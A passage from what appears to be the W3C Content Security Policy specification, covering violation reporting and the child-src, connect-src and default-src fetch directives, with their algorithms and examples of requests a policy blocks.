        [`sample`{.idl}](#dom-securitypolicyviolationevent-sample){#ref-for-dom-securitypolicyviolationevent-sample① link-type="idl"}

        :   `violation`{.variable}'s
            [sample](#violation-sample){#ref-for-violation-sample⑤
            link-type="dfn"}

        [`bubbles`{.idl}](https://dom.spec.whatwg.org/#dom-event-bubbles){#ref-for-dom-event-bubbles link-type="idl"}

        :   `true`

        [`composed`{.idl}](https://dom.spec.whatwg.org/#dom-event-composed){#ref-for-dom-event-composed link-type="idl"}

        :   `true`

        [Note:]{.marker} We set the
        [`composed`{.idl}](https://dom.spec.whatwg.org/#dom-event-composed){#ref-for-dom-event-composed①
        link-type="idl"} attribute, which means that this event can be
        captured on its way into, and will bubble its way out of a
        shadow tree.
        [`target`{.idl}](https://dom.spec.whatwg.org/#dom-event-target){#ref-for-dom-event-target
        link-type="idl"}, et al will be automagically scoped correctly
        for the main tree.

        [Note:]{.marker} Both
        [`effectiveDirective`{.idl}](#dom-securitypolicyviolationevent-effectivedirective){#ref-for-dom-securitypolicyviolationevent-effectivedirective①
        link-type="idl"} and
        [`violatedDirective`{.idl}](#dom-securitypolicyviolationevent-violateddirective){#ref-for-dom-securitypolicyviolationevent-violateddirective①
        link-type="idl"} are the same value. This is intentional to
        maintain backwards compatibility.

    4.  If `violation`{.variable}'s
        [policy](#violation-policy){#ref-for-violation-policy⑥
        link-type="dfn"}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set①⓪
        link-type="dfn"} contains a
        [directive](#directives){#ref-for-directives①⑦ link-type="dfn"}
        named \"[`report-uri`](#report-uri){#ref-for-report-uri①
        link-type="dfn"}\" `directive`{.variable}:

        1.  If `violation`{.variable}'s
            [policy](#violation-policy){#ref-for-violation-policy⑦
            link-type="dfn"}'s [directive
            set](#policy-directive-set){#ref-for-policy-directive-set①①
            link-type="dfn"} contains a
            [directive](#directives){#ref-for-directives①⑧
            link-type="dfn"} named
            \"[`report-to`](#report-to){#ref-for-report-to①
            link-type="dfn"}\", skip the remaining substeps.

        2.  [For
            each](https://infra.spec.whatwg.org/#list-iterate){#ref-for-list-iterate②⑦
            link-type="dfn"} `token`{.variable} of
            `directive`{.variable}'s
            [value](#directive-value){#ref-for-directive-value①③
            link-type="dfn"}:

            1.  Let `endpoint`{.variable} be the result of executing the
                [URL
                parser](https://url.spec.whatwg.org/#concept-url-parser){#ref-for-concept-url-parser
                link-type="dfn"} with `token`{.variable} as the input,
                and `violation`{.variable}'s
                [url](#violation-url){#ref-for-violation-url②
                link-type="dfn"} as the [base
                URL](https://url.spec.whatwg.org/#concept-base-url){#ref-for-concept-base-url
                link-type="dfn"}.

            2.  If `endpoint`{.variable} is not a valid URL, skip the
                remaining substeps.

            3.  Let `request`{.variable} be a new
                [request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⑥
                link-type="dfn"}, initialized as follows:

                [method](https://fetch.spec.whatwg.org/#concept-request-method){#ref-for-concept-request-method link-type="dfn"}

                :   \"`POST`\"

                [url](https://fetch.spec.whatwg.org/#concept-request-url){#ref-for-concept-request-url④ link-type="dfn"}

                :   `endpoint`{.variable}

                [origin](https://fetch.spec.whatwg.org/#concept-request-origin){#ref-for-concept-request-origin link-type="dfn"}

                :   `violation`{.variable}'s [global
                    object](#violation-global-object){#ref-for-violation-global-object⑥
                    link-type="dfn"}'s [relevant settings
                    object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object){#ref-for-relevant-settings-object
                    link-type="dfn"}'s
                    [origin](https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin){#ref-for-concept-settings-object-origin①
                    link-type="dfn"}

                [traversable for user prompts](https://fetch.spec.whatwg.org/#concept-request-window){#ref-for-concept-request-window link-type="dfn"}

                :   \"`no-traversable`\"

                [client](https://fetch.spec.whatwg.org/#concept-request-client){#ref-for-concept-request-client⑤ link-type="dfn"}

                :   `violation`{.variable}'s [global
                    object](#violation-global-object){#ref-for-violation-global-object⑦
                    link-type="dfn"}'s [relevant settings
                    object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object){#ref-for-relevant-settings-object①
                    link-type="dfn"}

                [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination③ link-type="dfn"}

                :   \"`report`\"

                [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator){#ref-for-concept-request-initiator link-type="dfn"}

                :   \"\"

                [credentials mode](https://fetch.spec.whatwg.org/#concept-request-credentials-mode){#ref-for-concept-request-credentials-mode link-type="dfn"}

                :   \"`same-origin`\"

                [keepalive](https://fetch.spec.whatwg.org/#request-keepalive-flag){#ref-for-request-keepalive-flag link-type="dfn"}

                :   \"`true`\"

                [header list](https://fetch.spec.whatwg.org/#concept-request-header-list){#ref-for-concept-request-header-list link-type="dfn"}

                :   A header list containing a single header whose name
                    is \"`Content-Type`\", and value is
                    \"`application/csp-report`\"

                [body](https://fetch.spec.whatwg.org/#concept-request-body){#ref-for-concept-request-body link-type="dfn"}

                :   The result of executing [§ 5.3 Obtain the deprecated
                    serialization of
                    violation](#deprecated-serialize-violation) on
                    `violation`{.variable}

                [redirect mode](https://fetch.spec.whatwg.org/#concept-request-redirect-mode){#ref-for-concept-request-redirect-mode link-type="dfn"}

                :   \"`error`\"

                [Note:]{.marker} `request`{.variable}'s
                [mode](https://fetch.spec.whatwg.org/#concept-request-mode){#ref-for-concept-request-mode
                link-type="dfn"} defaults to \"`no-cors`\"; the response
                is ignored entirely.

            4.  [Fetch](https://fetch.spec.whatwg.org/#concept-fetch){#ref-for-concept-fetch
                link-type="dfn"} `request`{.variable}. The result will
                be ignored.

        [Note:]{.marker} All of this should be considered deprecated. It
        sends a single request per violation, which simply isn't
        scalable. As soon as this behavior can be removed from user
        agents, it will be.

        [Note:]{.marker} `report-uri` only takes effect if `report-to`
        is not present. That is, the latter overrides the former,
        allowing for backwards compatibility with browsers that don't
        support the new mechanism.

    5.  If `violation`{.variable}'s
        [policy](#violation-policy){#ref-for-violation-policy⑧
        link-type="dfn"}'s [directive
        set](#policy-directive-set){#ref-for-policy-directive-set①②
        link-type="dfn"} contains a
        [directive](#directives){#ref-for-directives①⑨ link-type="dfn"}
        named \"[`report-to`](#report-to){#ref-for-report-to②
        link-type="dfn"}\" `directive`{.variable}:

        1.  Let `body`{.variable} be a new
            [`CSPViolationReportBody`{.idl}](#dictdef-cspviolationreportbody){#ref-for-dictdef-cspviolationreportbody
            link-type="idl"}, initialized as follows:

            [`documentURL`{.idl}](#dom-cspviolationreportbody-documenturl){#ref-for-dom-cspviolationreportbody-documenturl link-type="idl"}

            :   The result of executing [§ 5.4 Strip URL for use in
                reports](#strip-url-for-use-in-reports) on
                `violation`{.variable}'s
                [url](#violation-url){#ref-for-violation-url③
                link-type="dfn"}.

            [`referrer`{.idl}](#dom-cspviolationreportbody-referrer){#ref-for-dom-cspviolationreportbody-referrer link-type="idl"}

            :   The result of executing [§ 5.4 Strip URL for use in
                reports](#strip-url-for-use-in-reports) on
                `violation`{.variable}'s
                [referrer](#violation-referrer){#ref-for-violation-referrer③
                link-type="dfn"}.

            [`blockedURL`{.idl}](#dom-cspviolationreportbody-blockedurl){#ref-for-dom-cspviolationreportbody-blockedurl link-type="idl"}

            :   The result of executing [§ 5.2 Obtain the blockedURI of
                a violation's resource](#obtain-violation-blocked-uri)
                on `violation`{.variable}'s
                [resource](#violation-resource){#ref-for-violation-resource①⑥
                link-type="dfn"}.

            [`effectiveDirective`{.idl}](#dom-cspviolationreportbody-effectivedirective){#ref-for-dom-cspviolationreportbody-effectivedirective link-type="idl"}

            :   `violation`{.variable}'s [effective
                directive](#violation-effective-directive){#ref-for-violation-effective-directive⑤
                link-type="dfn"}.

            [`originalPolicy`{.idl}](#dom-cspviolationreportbody-originalpolicy){#ref-for-dom-cspviolationreportbody-originalpolicy link-type="idl"}

            :   The
                [serialization](#serialized-csp){#ref-for-serialized-csp⑦
                link-type="dfn"} of `violation`{.variable}'s
                [policy](#violation-policy){#ref-for-violation-policy⑨
                link-type="dfn"}.

            [`sourceFile`{.idl}](#dom-cspviolationreportbody-sourcefile){#ref-for-dom-cspviolationreportbody-sourcefile link-type="idl"}

            :   The result of executing [§ 5.4 Strip URL for use in
                reports](#strip-url-for-use-in-reports) on
                `violation`{.variable}'s [source
                file](#violation-source-file){#ref-for-violation-source-file⑥
                link-type="dfn"}, if `violation`{.variable}'s [source
                file](#violation-source-file){#ref-for-violation-source-file⑦
                link-type="dfn"} is not null, or null otherwise.

            [`sample`{.idl}](#dom-cspviolationreportbody-sample){#ref-for-dom-cspviolationreportbody-sample link-type="idl"}

            :   `violation`{.variable}'s
                [sample](#violation-sample){#ref-for-violation-sample⑥
                link-type="dfn"}.

            [`disposition`{.idl}](#dom-cspviolationreportbody-disposition){#ref-for-dom-cspviolationreportbody-disposition link-type="idl"}

            :   `violation`{.variable}'s
                [disposition](#violation-disposition){#ref-for-violation-disposition①
                link-type="dfn"}.

            [`statusCode`{.idl}](#dom-cspviolationreportbody-statuscode){#ref-for-dom-cspviolationreportbody-statuscode link-type="idl"}

            :   `violation`{.variable}'s
                [status](#violation-status){#ref-for-violation-status③
                link-type="dfn"}.

            [`lineNumber`{.idl}](#dom-cspviolationreportbody-linenumber){#ref-for-dom-cspviolationreportbody-linenumber link-type="idl"}

            :   `violation`{.variable}'s [line
                number](#violation-line-number){#ref-for-violation-line-number③
                link-type="dfn"}, if `violation`{.variable}'s [source
                file](#violation-source-file){#ref-for-violation-source-file⑧
                link-type="dfn"} is not null, or null otherwise.

            [`columnNumber`{.idl}](#dom-cspviolationreportbody-columnnumber){#ref-for-dom-cspviolationreportbody-columnnumber link-type="idl"}

            :   `violation`{.variable}'s [column
                number](#violation-column-number){#ref-for-violation-column-number③
                link-type="dfn"}, if `violation`{.variable}'s [source
                file](#violation-source-file){#ref-for-violation-source-file⑨
                link-type="dfn"} is not null, or null otherwise.

        2.  Let `settings object`{.variable} be `violation`{.variable}'s
            [global
            object](#violation-global-object){#ref-for-violation-global-object⑧
            link-type="dfn"}'s [relevant settings
            object](https://html.spec.whatwg.org/multipage/webappapis.html#relevant-settings-object){#ref-for-relevant-settings-object②
            link-type="dfn"}.

        3.  [Generate and queue a
            report](https://www.w3.org/TR/reporting-1/#generate-and-queue-a-report){#ref-for-generate-and-queue-a-report①
            link-type="dfn"} with the following arguments:

            `context`{.variable}

            :   `settings object`{.variable}

            `type`{.variable}

            :   \"csp-violation\"

            `destination`{.variable}

            :   `directive`{.variable}'s
                [value](#directive-value){#ref-for-directive-value①④
                link-type="dfn"}.

            `data`{.variable}

            :   `body`{.variable}
::::

::::::::::::::::::: section
## [6. ]{.secno}[ Content Security Policy Directives ]{.content}[](#csp-directives){.self-link} {#csp-directives .heading .settled level="6"}

This specification defines a number of types of
[directives](#directives){#ref-for-directives②⓪ link-type="dfn"} which
allow developers to control certain aspects of their sites\' behavior.
This document defines directives which govern resource fetching (in
[§ 6.1 Fetch Directives](#directives-fetch)), directives which govern
the state of a document (in [§ 6.3 Document
Directives](#directives-document)), directives which govern aspects of
navigation (in [§ 6.4 Navigation Directives](#directives-navigation)),
and directives which govern reporting (in [§ 6.5 Reporting
Directives](#directives-reporting)). These form the core of Content
Security Policy; other directives are defined in a modular fashion in
ancillary documents (see [§ 6.6 Directives Defined in Other
Documents](#directives-elsewhere) for examples).

To mitigate the risk of cross-site scripting attacks, web developers
SHOULD include directives that regulate sources of script and plugins.
They can do so by including:

- Both the [script-src](#script-src){#ref-for-script-src
  link-type="dfn"} and [object-src](#object-src){#ref-for-object-src
  link-type="dfn"} directives, or

- a [default-src](#default-src){#ref-for-default-src link-type="dfn"}
  directive

In either case, developers SHOULD NOT include either
[`'unsafe-inline'`](#grammardef-unsafe-inline){#ref-for-grammardef-unsafe-inline
link-type="grammar"}, or `data:` as valid sources in their policies.
Both enable XSS attacks by allowing code to be included directly in the
document itself; they are best avoided completely.

### [6.1. ]{.secno}[ Fetch Directives ]{.content}[](#directives-fetch){.self-link} {#directives-fetch .heading .settled level="6.1"}

[Fetch directives]{#fetch-directives .dfn .dfn-paneled dfn-type="dfn"
export=""} control the locations from which certain resource types may
be loaded. For instance, [script-src](#script-src){#ref-for-script-src①
link-type="dfn"} allows developers to allow trusted sources of script to
execute on a page, while [font-src](#font-src){#ref-for-font-src
link-type="dfn"} controls the sources of web fonts.

#### [6.1.1. ]{.secno}[`child-src`]{.content}[](#directive-child-src){.self-link} {#directive-child-src .heading .settled level="6.1.1"}

The [`child-src`]{#child-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive governs the creation of [child
navigables](https://html.spec.whatwg.org/multipage/document-sequences.html#child-navigable){#ref-for-child-navigable
link-type="dfn"} (e.g.
[`iframe`](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element){#ref-for-the-iframe-element
link-type="element"} and
[`frame`](https://html.spec.whatwg.org/multipage/obsolete.html#frame){#ref-for-frame
link-type="element"} navigations) and Worker execution contexts. The
syntax for the directive's name and value is described by the following
ABNF:

    directive-name  = "child-src"
    directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⑦
link-type="dfn"} which will populate a frame or a worker. More formally,
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⑧
link-type="dfn"} falling into one of the following categories:

- [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination④
  link-type="dfn"} is \"`frame`\", \"`iframe`\", \"`object`\", or
  \"`embed`\".

- [destination](https://fetch.spec.whatwg.org/#concept-request-destination){#ref-for-concept-request-destination⑤
  link-type="dfn"} is either \"`serviceworker`\", \"`sharedworker`\", or
  \"`worker`\" (which are fed to the [run a
  worker](https://html.spec.whatwg.org/multipage/workers.html#run-a-worker){#ref-for-run-a-worker①
  link-type="dfn"} algorithm for
  [`ServiceWorker`{.idl}](https://www.w3.org/TR/service-workers/#serviceworker){#ref-for-serviceworker
  link-type="idl"},
  [`SharedWorker`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#sharedworker){#ref-for-sharedworker
  link-type="idl"}, and
  [`Worker`{.idl}](https://html.spec.whatwg.org/multipage/workers.html#worker){#ref-for-worker①
  link-type="idl"}, respectively).

::: {#example-55db5b11 .example}
[](#example-55db5b11){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: child-src https://example.com/

Fetches for the following code will all return network errors, as the
URLs provided do not match `child-src`'s [source
list](#source-lists){#ref-for-source-lists link-type="dfn"}:

``` highlight
<iframe src="https://example.org"></iframe>
<script>
  var blockedWorker = new Worker("data:application/javascript,...");
</script>
```
:::

##### [6.1.1.1. ]{.secno}[ `child-src` Pre-request check ]{.content}[](#child-src-pre-request){.self-link} {#child-src-pre-request .algorithm .heading .settled algorithm="child-src Pre-request check" level="6.1.1.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check①
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request①⑨
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object②⑨
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `child-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing the [pre-request
    check](#directive-pre-request-check){#ref-for-directive-pre-request-check②
    link-type="dfn"} for the
    [directive](#directives){#ref-for-directives②① link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①①
    link-type="dfn"} is `name`{.variable} on `request`{.variable} and
    `policy`{.variable}, using this directive's
    [value](#directive-value){#ref-for-directive-value①⑤
    link-type="dfn"} for the comparison.

##### [6.1.1.2. ]{.secno}[ `child-src` Post-request check ]{.content}[](#child-src-post-request){.self-link} {#child-src-post-request .algorithm .heading .settled algorithm="child-src Post-request check" level="6.1.1.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check②
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⓪
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①⓪
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⓪
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `child-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing the [post-request
    check](#directive-post-request-check){#ref-for-directive-post-request-check③
    link-type="dfn"} for the
    [directive](#directives){#ref-for-directives②② link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①②
    link-type="dfn"} is `name`{.variable} on `request`{.variable},
    `response`{.variable}, and `policy`{.variable}, using this
    directive's [value](#directive-value){#ref-for-directive-value①⑥
    link-type="dfn"} for the comparison.

#### [6.1.2. ]{.secno}[`connect-src`]{.content}[](#directive-connect-src){.self-link} {#directive-connect-src .heading .settled level="6.1.2"}

The [connect-src]{#connect-src .dfn .dfn-paneled dfn-type="dfn"
export=""} directive restricts the URLs which can be loaded using script
interfaces. The syntax for the directive's name and value is described
by the following ABNF:

    directive-name  = "connect-src"
    directive-value = serialized-source-list

This directive controls
[requests](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②①
link-type="dfn"} which transmit or receive data from other origins. This
includes APIs like `fetch()`,
[\[XHR\]](#biblio-xhr "XMLHttpRequest Standard"){link-type="biblio"},
[\[EVENTSOURCE\]](#biblio-eventsource "Server-Sent Events"){link-type="biblio"},
[\[BEACON\]](#biblio-beacon "Beacon"){link-type="biblio"}, and
[`a`](https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element){#ref-for-the-a-element
link-type="element"}'s
[`ping`](https://html.spec.whatwg.org/multipage/links.html#ping){#ref-for-ping
link-type="element-sub"}. This directive *also* controls WebSocket
[\[WEBSOCKETS\]](#biblio-websockets "WebSockets Standard"){link-type="biblio"}
connections, though those aren't technically part of Fetch.

::: {#example-03b12b1d .example}
[](#example-03b12b1d){.self-link} JavaScript offers a few mechanisms
that directly connect to an external server to send or receive
information. `EventSource` maintains an open HTTP connection to a server
in order to receive push notifications, `WebSockets` open a
bidirectional communication channel between your browser and a server,
and `XMLHttpRequest` makes arbitrary HTTP requests on your behalf. These
are powerful APIs that enable useful functionality, but also provide
tempting avenues for data exfiltration.

The `connect-src` directive allows you to ensure that these and similar
sorts of connections are only opened to origins you trust. Sending a
policy that defines a list of source expressions for this directive is
straightforward. For example, to limit connections to only
`https://example.com`, send the following header:

    Content-Security-Policy: connect-src https://example.com/

Fetches for the following code will all return network errors, as the
URLs provided do not match `connect-src`'s [source
list](#source-lists){#ref-for-source-lists① link-type="dfn"}:

``` highlight
<a ping="https://example.org">...
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://example.org/');
  xhr.send();

  var ws = new WebSocket("wss://example.org/");

  var es = new EventSource("https://example.org/");

  navigator.sendBeacon("https://example.org/", { ... });
</script>
```
:::

##### [6.1.2.1. ]{.secno}[ `connect-src` Pre-request check ]{.content}[](#connect-src-pre-request){.self-link} {#connect-src-pre-request .algorithm .heading .settled algorithm="connect-src Pre-request check" level="6.1.2.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check③
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②②
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③①
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `connect-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.5 Does request match source
    list?](#match-request-to-source-list) on `request`{.variable}, this
    directive's [value](#directive-value){#ref-for-directive-value①⑦
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

##### [6.1.2.2. ]{.secno}[ `connect-src` Post-request check ]{.content}[](#connect-src-post-request){.self-link} {#connect-src-post-request .algorithm .heading .settled algorithm="connect-src Post-request check" level="6.1.2.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check④
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②③
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①①
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③②
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `connect-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  If the result of executing [§ 6.7.2.6 Does response to request match
    source list?](#match-response-to-source-list) on
    `response`{.variable}, `request`{.variable}, this directive's
    [value](#directive-value){#ref-for-directive-value①⑧
    link-type="dfn"}, and `policy`{.variable}, is \"`Does Not Match`\",
    return \"`Blocked`\".

4.  Return \"`Allowed`\".

#### [6.1.3. ]{.secno}[`default-src`]{.content}[](#directive-default-src){.self-link} {#directive-default-src .heading .settled level="6.1.3"}

The [default-src]{#default-src .dfn .dfn-paneled dfn-type="dfn"
export=""} directive serves as a fallback for the other [fetch
directives](#fetch-directives){#ref-for-fetch-directives
link-type="dfn"}. The syntax for the directive's name and value is
described by the following ABNF:

    directive-name  = "default-src"
    directive-value = serialized-source-list

If a [default-src](#default-src){#ref-for-default-src① link-type="dfn"}
directive is present in a policy, its value will be used as the policy's
default source list. That is, given
`default-src 'none'; script-src 'self'`, script requests will use
`'self'` as the [source list](#source-lists){#ref-for-source-lists②
link-type="dfn"} to match against. Other requests will use `'none'`.
This is spelled out in more detail in the [§ 4.1.2 Should request be
blocked by Content Security
Policy?](#should-block-request){#ref-for-should-block-request③} and
[§ 4.1.3 Should response to request be blocked by Content Security
Policy?](#should-block-response){#ref-for-should-block-response③}
algorithms.

::: {.note role="note"}
Resource hints such as
[`prefetch`](https://html.spec.whatwg.org/#link-type-prefetch){#ref-for-link-type-prefetch
link-type="attr-value"} and
[`preconnect`](https://html.spec.whatwg.org/#link-type-preconnect){#ref-for-link-type-preconnect
link-type="attr-value"} generate requests that aren't tied to any
specific [fetch directive](#fetch-directives){#ref-for-fetch-directives①
link-type="dfn"}, but are instead governed by the union of servers
allowed in all of a policy's directives\' [source
lists](#source-lists){#ref-for-source-lists③ link-type="dfn"}. If
[default-src](#default-src){#ref-for-default-src② link-type="dfn"} is
not specified, these requests will always be allowed. For more
information, see [§ 8.6 Exfiltration](#exfiltration).
[\[HTML\]](#biblio-html "HTML Standard"){link-type="biblio"}
:::

::: {#example-efa36e1b .example}
[](#example-efa36e1b){.self-link} The following header:

    Content-Security-Policy: default-src 'self'

will have the same behavior as the following header:

    Content-Security-Policy: connect-src 'self';
                             font-src 'self';
                             frame-src 'self';
                             img-src 'self';
                             manifest-src 'self';
                             media-src 'self';
                             object-src 'self';
                             script-src-elem 'self';
                             script-src-attr 'self';
                             style-src-elem 'self';
                             style-src-attr 'self';
                             worker-src 'self'

That is, when `default-src` is set, every [fetch
directive](#fetch-directives){#ref-for-fetch-directives②
link-type="dfn"} that isn't explicitly set will fall back to the value
`default-src` specifies.
:::

::: {#example-fae89c48 .example}
[](#example-fae89c48){.self-link} There is no inheritance. If a
`script-src` directive is explicitly specified, for example, then the
value of `default-src` has no influence on script requests. That is, the
following header:

    Content-Security-Policy: default-src 'self'; script-src-elem https://example.com

will have the same behavior as the following header:

    Content-Security-Policy: connect-src 'self';
                             font-src 'self';
                             frame-src 'self';
                             img-src 'self';
                             manifest-src 'self';
                             media-src 'self';
                             object-src 'self';
                             script-src-elem https://example.com;
                             script-src-attr 'self';
                             style-src-elem 'self';
                             style-src-attr 'self';
                             worker-src 'self'

Given this behavior, one good way to build a policy for a site would be
to begin with a `default-src` of `'none'`, and to build up a policy from
there which allowed only those resource types which are necessary for
the particular page the policy will apply to.
:::

##### [6.1.3.1. ]{.secno}[ `default-src` Pre-request check ]{.content}[](#default-src-pre-request){.self-link} {#default-src-pre-request .algorithm .heading .settled algorithm="default-src Pre-request check" level="6.1.3.1"}

This directive's [pre-request
check](#directive-pre-request-check){#ref-for-directive-pre-request-check④
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②④
link-type="dfn"} `request`{.variable} and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③③
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `default-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing the [pre-request
    check](#directive-pre-request-check){#ref-for-directive-pre-request-check⑤
    link-type="dfn"} for the
    [directive](#directives){#ref-for-directives②③ link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①③
    link-type="dfn"} is `name`{.variable} on `request`{.variable} and
    `policy`{.variable}, using this directive's
    [value](#directive-value){#ref-for-directive-value①⑨
    link-type="dfn"} for the comparison.

##### [6.1.3.2. ]{.secno}[ `default-src` Post-request check ]{.content}[](#default-src-post-request){.self-link} {#default-src-post-request .algorithm .heading .settled algorithm="default-src Post-request check" level="6.1.3.2"}

This directive's [post-request
check](#directive-post-request-check){#ref-for-directive-post-request-check⑤
link-type="dfn"} is as follows:

Given a
[request](https://fetch.spec.whatwg.org/#concept-request){#ref-for-concept-request②⑤
link-type="dfn"} `request`{.variable}, a
[response](https://fetch.spec.whatwg.org/#concept-response){#ref-for-concept-response①②
link-type="dfn"} `response`{.variable}, and a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③④
link-type="dfn"} `policy`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.1 Get the
    effective directive for request](#effective-directive-for-a-request)
    on `request`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `default-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Return the result of executing the [post-request
    check](#directive-post-request-check){#ref-for-directive-post-request-check⑥
    link-type="dfn"} for the
    [directive](#directives){#ref-for-directives②④ link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①④
    link-type="dfn"} is `name`{.variable} on `request`{.variable},
    `response`{.variable}, and `policy`{.variable}, using this
    directive's [value](#directive-value){#ref-for-directive-value②⓪
    link-type="dfn"} for the comparison.

##### [6.1.3.3. ]{.secno}[ `default-src` Inline Check ]{.content}[](#default-src-inline){.self-link} {#default-src-inline .algorithm .heading .settled algorithm="default-src Inline Check" level="6.1.3.3"}

This directive's [inline
check](#directive-inline-check){#ref-for-directive-inline-check②
link-type="dfn"} algorithm is as follows:

Given an
[`Element`{.idl}](https://dom.spec.whatwg.org/#element){#ref-for-element②
link-type="idl"} `element`{.variable}, a string `type`{.variable}, a
[policy](#content-security-policy-object){#ref-for-content-security-policy-object③⑤
link-type="dfn"} `policy`{.variable} and a string `source`{.variable}:

1.  Let `name`{.variable} be the result of executing [§ 6.8.2 Get the
    effective directive for inline
    checks](#effective-directive-for-inline-check) on `type`{.variable}.

2.  If the result of executing [§ 6.8.4 Should fetch directive
    execute](#should-directive-execute) on `name`{.variable},
    `default-src` and `policy`{.variable} is \"`No`\", return
    \"`Allowed`\".

3.  Otherwise, return the result of executing the [inline
    check](#directive-inline-check){#ref-for-directive-inline-check③
    link-type="dfn"} for the
    [directive](#directives){#ref-for-directives②⑤ link-type="dfn"}
    whose [name](#directive-name){#ref-for-directive-name①⑤
    link-type="dfn"} is `name`{.variable} on `element`{.variable},
    `type`{.variable}, `policy`{.variable} and `source`{.variable},
    using this directive's
    [value](#directive-value){#ref-for-directive-value②①
    link-type="dfn"} for the comparison.

#### [6.1.4. ]{.secno}[`font-src`]{.content}[](#directive-font-src){.self-link} {#directive-font-src .heading .settled level="6.1.4"}

The [font-src]{#font-src .dfn .dfn-paneled dfn-type="dfn" export=""}
directive restricts the URLs from which font resources may be loaded.
The syntax for the directive's name and value is described by the
following ABNF:

    directive-name  = "font-src"
    directive-value = serialized-source-list

::: {#example-3d6c348e .example}
[](#example-3d6c348e){.self-link} Given a page with the following
Content Security Policy:

    Content-Security-Policy: font-src https://example.com/

Fetches for the following code will return a network error, as the URL
provided does not match `font-src`'s [source
list](#source-lists){#ref-for-source-lists④ link-type="dfn"}:

``` highlight
<style>
  @font-face {
    font-family: "Example Font";
    src: url("https://example.org/font");
  }
  body {
    font-family: "Example Font";
  }
</style>
```
:::

##### [6.1.4.1. ]{.secno}[ `font-src` Pre-request check ]{.content}[](#font-src-pre-request){.self-link} {#font-src-pre-request .algorithm .heading .settled algorithm="font-src Pre-request check" level="6.1.4.1"}

